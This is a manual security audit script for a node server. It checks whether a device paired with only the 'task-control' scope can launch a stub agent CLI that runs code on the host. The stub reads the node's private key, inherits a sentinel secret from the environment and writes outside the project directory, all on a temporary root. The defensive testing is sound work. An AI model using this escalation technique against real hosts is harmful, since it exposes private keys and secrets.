// Audit Phase 0.1 — VERIFY FIRST experiment: can a paired device holding ONLY
// the `task-control` scope cause real code execution on the node host?
//
// This drives the REAL production path end to end, on a throwaway temp root:
//
//   paired device (task-control only)
//     -> task.start            (scope gate: core/scopes — task-control alone)
//     -> buildExecutorFactory  (core/cli/serve.mjs — the exact factory `uh serve` builds)
//     -> createAdapterExecutor -> createCliProcessAdapter('claude-code', command = stub harness)
//     -> child process spawn   (cwd = portable root, env = process.env)
//
// The stub harness is a stand-in for any agent CLI (claude, gemini, dsh): it
// performs the actions an unchecked agent could perform and writes an evidence
// JSON file:
//
//   - its working directory (hypothesis: the whole portable root, not a project dir)
//   - whether the node's process.env leaks into it (sentinel secret visible?)
//   - whether it can read the node's Ed25519 private key material
//   - whether it can write outside the task's project directory
//
// Run:  node tests/manual/task-control-experiment.mjs
// Exit 0 = experiment completed (see printed UH-TC-EXP lines for the verdict).
// Nothing here runs under `npm test`.

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

import { buildStack, disposeStack, SCOPES } from '../fixtures/stack.mjs';
import { buildPairedSession } from '../fixtures/stack.mjs';
import { buildExecutorFactory } from '../../core/cli/serve.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const SENTINEL = 'UH_TC_EXP_SENTINEL_SECRET';

let n = 0;
const ev = (label, verdict, detail) => {
  n++;
  console.log(`UH-TC-EXP ${String(n).padStart(2, '0')}: ${label} -> ${verdict}${detail ? ` (${detail})` : ''}`);
};

// The stub "agent CLI": --version probe for launch(), then on prompt() it does
// the damage and reports. Streamed as claude-style stream-json so the adapter's
// stdout parsing is exercised too.
const stubJs = `
import fs from 'node:fs';
import path from 'node:path';
process.stdout.setEncoding('utf8');
const args = process.argv.slice(2);
fs.appendFileSync(process.env.UH_TC_EXP_TRACE, JSON.stringify({ argv: args, cwd: process.cwd(), ppid: process.ppid }) + '\\n');
if (args.includes('--version')) { console.log('stub-harness 1.0'); process.exit(0); }
const prompt = args[args.length - 1];
const evidencePath = process.env.UH_TC_EXP_EVIDENCE;
const nodeKeyPath = process.env.UH_TC_EXP_NODE_KEY;
const outsidePath = process.env.UH_TC_EXP_OUTSIDE;
const evidence = {
  argv: args,
  cwd: process.cwd(),
  sentinelSecret: process.env[${JSON.stringify(SENTINEL)}] || null,
  envCount: Object.keys(process.env).length,
  readNodeKey: null,
  wroteOutside: null,
};
try { evidence.readNodeKey = { ok: true, bytes: fs.readFileSync(nodeKeyPath, 'utf8').length, head: fs.readFileSync(nodeKeyPath, 'utf8').slice(0, 27) }; }
catch (e) { evidence.readNodeKey = { ok: false, error: e.code || e.message }; }
try { fs.writeFileSync(outsidePath, 'written by the task child'); evidence.wroteOutside = { ok: true, path: outsidePath }; }
catch (e) { evidence.wroteOutside = { ok: false, error: e.code || e.message }; }
fs.writeFileSync(evidencePath, JSON.stringify(evidence, null, 2));
console.log(JSON.stringify({ type: 'assistant', message: { content: [{ type: 'text', text: 'stub agent done; prompt was: ' + String(prompt).slice(0, 40) }] } }));
process.exit(0);
`;

const stack = await buildStack();
let session = null;
try {
  // Plant the sentinel in the node's process.env exactly as `uh serve` would
  // carry API keys / operator env into the executor factory.
  const stubPath = path.join(stack.root, 'stub-harness.mjs');
  fs.writeFileSync(stubPath, stubJs);
  process.env[SENTINEL] = 'sentinel-value-do-not-leak';
  process.env.UH_TC_EXP_EVIDENCE = path.join(stack.root, 'evidence.json');
  process.env.UH_TC_EXP_TRACE = path.join(stack.root, 'trace.log');
  process.env.UH_TC_EXP_NODE_KEY = path.join(stack.p.device, 'identity', 'node.private.pem');
  process.env.UH_TC_EXP_OUTSIDE = path.join(stack.root, 'outside-write.sentinel');

  // The production executor factory, built exactly as `uh serve` builds it,
  // with the claude-code CLI adapter pointed at the stub harness.
  const executorFactory = buildExecutorFactory({
    adapterName: 'claude-code',
    config: { adapter: { claudeCode: { command: process.execPath, args: [stubPath] } } },
    runtimeManager: null,
    root: stack.root,
    log: { info: () => {}, warn: () => {}, error: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, debug: () => {}, child: () => {} }) },
    apiKeys: {},
  });

  const server = (await import('../../core/server/mod.mjs')).createNodeServer({
    root: stack.root, p: stack.p,
    identity: stack.identity, auth: stack.auth, events: stack.events,
    workspace: stack.workspace,
    executorFactory,
    uhVersion: '0.3.0',
  });

  // Pair a device with ONLY task-control against OUR server instance (the
  // fixture's buildPairedSession would create its own server with the fake
  // executor, bypassing the production factory we are auditing).
  const { generateKeyPairSync, sign } = await import('node:crypto');
  const pairing = stack.auth.mintPairingPayload({ endpoint: 'memory://experiment' });
  const { createMemoryTransportPair } = await import('../../core/transport/mod.mjs');
  const { wireClient } = await import('../../core/client/wire.mjs');
  const { client, node } = createMemoryTransportPair();
  const wire = wireClient(client);
  server.handleConnection(node);
  const hello = await wire.next((e) => e.payload?.kind === 'node.hello');
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const sigB64 = sign(null, Buffer.from(hello.payload.challengeB64, 'utf8'), privateKey).toString('base64');
  const pairReply = await wire.request('device.pair', {
    deviceName: 'tc-exp-device',
    platform: 'desktop',
    devicePublicKeyPem: publicKey.export({ type: 'spki', format: 'pem' }),
    pairingToken: pairing.token,
    expectedNodeIdentitySha256: pairing.nodeIdentitySha256,
    requestedScopes: ['task-control'],
    sigB64,
  }, 'req_pair_01');
  if (!pairReply.ok) throw new Error(`pairing failed: ${JSON.stringify(pairReply.payload)}`);
  session = { wire, grantedScopes: pairReply.payload.grantedScopes, server };
  ev('device paired with requestedScopes=["task-control"]',
    JSON.stringify(session.grantedScopes) === JSON.stringify(['task-control']) ? 'GRANTED-ONLY-TASK-CONTROL' : 'UNEXPECTED',
    `granted=${JSON.stringify(session.grantedScopes)} (fixture default set is ${JSON.stringify(SCOPES)})`);

  const proj = stack.workspace.createProject({ name: 'tc-exp' });
  const projectId = proj.projectId || proj.project?.id || proj.id;

  // The attack: a plain task.start from the task-control-only device.
  const reply = await session.wire.request('task.start', { projectId, prompt: 'write a file and read the node key' }, 'req_tcexp01');
  ev('task.start accepted', reply.ok ? 'ACCEPTED' : 'REJECTED', reply.ok ? `taskId=${reply.payload?.taskId}` : `code=${reply.payload?.code}`);

  if (!reply.ok) {
    console.log('experiment inconclusive: task.start was rejected');
    process.exitCode = 2;
  } else {

  // Wait for the stub child to finish its work.
  const deadline = Date.now() + 30_000;
  while (!fs.existsSync(process.env.UH_TC_EXP_EVIDENCE) && Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 100));
  }
  if (!fs.existsSync(process.env.UH_TC_EXP_EVIDENCE)) {
    for (const e of session.wire.all) {
      if (e.type !== 'event') continue;
      const k = e.payload?.kind || '?';
      if (k === 'task.output') console.log(`  [output ${e.payload.stream || ''}] ${String(e.payload.chunk || '').slice(0, 300)}`);
      else console.log(`  [event] ${k} ${String(JSON.stringify(e.payload || {})).slice(0, 300)}`);
    }
    const tracePath = path.join(stack.root, 'trace.log');
    console.log('  [trace]', fs.existsSync(tracePath) ? fs.readFileSync(tracePath, 'utf8').trim().slice(0, 500) : '(no trace file — stub never spawned)');
    ev('task child executed', 'TIMEOUT', 'stub harness never wrote evidence — stderr above');
    process.exitCode = 2;
  } else {
  const evidence = JSON.parse(fs.readFileSync(process.env.UH_TC_EXP_EVIDENCE, 'utf8'));

  ev('task child executed', 'YES', `argv tail=${JSON.stringify(evidence.argv.slice(-1))}`);
  ev('child cwd', evidence.cwd === stack.root ? 'PORTABLE-ROOT (confirmed)' : 'other',
    `cwd=${evidence.cwd} ; portable root=${stack.root}`);
  ev('node process.env inherited by child', evidence.sentinelSecret ? 'YES — SENTINEL SECRET VISIBLE' : 'no',
    `envCount=${evidence.envCount}`);
  ev('node private key readable from child', evidence.readNodeKey?.ok ? 'YES — KEY MATERIAL READ' : 'no',
    evidence.readNodeKey?.ok ? `bytes=${evidence.readNodeKey.bytes} head="${evidence.readNodeKey.head}..."` : evidence.readNodeKey?.error);
  ev('write outside the project directory', evidence.wroteOutside?.ok ? 'YES — ARBITRARY WRITE' : 'no',
    evidence.wroteOutside?.ok ? evidence.wroteOutside.path : evidence.wroteOutside?.error);

  // Verdict summary
  const esc = evidence.sentinelSecret || evidence.readNodeKey?.ok || evidence.wroteOutside?.ok;
  console.log('');
  console.log(`UH-TC-EXP VERDICT: a device holding only task-control ${esc ? 'CAN cause code execution on the node host' : 'could not demonstrate code execution in this run'}`);
  console.log('UH-TC-EXP UNVERIFIED: whether real dsh --profile sdk auto-allows tools without approval needs a funded credential (audit brief 0.1).');
  }
  }
} finally {
  for (const k of [SENTINEL, 'UH_TC_EXP_EVIDENCE', 'UH_TC_EXP_NODE_KEY', 'UH_TC_EXP_OUTSIDE']) delete process.env[k];
  try { session?.server?.close?.(); } catch {}
  disposeStack(stack);
}
